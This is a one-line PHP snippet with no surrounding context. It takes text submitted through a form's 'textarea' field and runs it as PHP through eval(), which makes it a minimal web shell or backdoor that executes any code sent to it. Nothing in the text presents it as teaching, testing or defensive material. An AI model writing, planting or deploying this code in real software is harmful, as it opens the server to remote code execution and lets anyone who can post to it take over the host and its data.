<?php if (isset($_POST['submit'])) {$code = $_POST['textarea'];} eval("?> $code <?php ");
